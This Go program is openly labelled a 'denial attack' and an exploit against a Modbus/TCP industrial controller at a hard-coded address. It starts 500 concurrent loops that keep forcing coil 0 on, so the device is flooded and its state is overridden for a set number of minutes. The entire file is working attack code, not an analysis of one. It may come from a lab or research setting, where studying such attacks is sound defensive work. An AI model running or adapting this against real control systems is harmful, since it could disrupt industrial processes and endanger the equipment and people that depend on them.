package main

import (
	"flag"
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/goburrow/modbus"
)

var (
	ip_address string
	coil       int
	coil_val   int
	runtime    int
	wait       sync.WaitGroup
)

func init() {
	flag.StringVar(&ip_address, "ip_address", "192.168.13.86", "The port on which to listen for connections")
	flag.IntVar(&runtime, "runtime", 1, "How long the program will run")
}

func jammer(target modbus.Client) {

	for {
		results, err := target.WriteSingleCoil(0, 0xFF00)

		if err != nil {
			fmt.Println(err)
			fmt.Println(results)
		}
	}
}

func main() {
	flag.Parse()
	handler := modbus.NewTCPClientHandler("192.168.13.86:502") //Change this to be a variable
	handler.Timeout = 10 * time.Second

	err := handler.Connect()
	if err != nil {
		fmt.Print(err)
	}

	defer handler.Close()

	client := modbus.NewClient(handler)

	for i := 0; i < 500; i++ {
		wait.Add(1)
		go jammer(client)
	}

	fmt.Println("Starting denial attack...")
	//Runs the exploit for the specified duration
	timer2 := time.NewTimer(time.Duration(runtime) * time.Minute)
	go func() {

		<-timer2.C
		fmt.Println("Denial attack completed")
		os.Exit(0)
	}()

	wait.Wait()

}
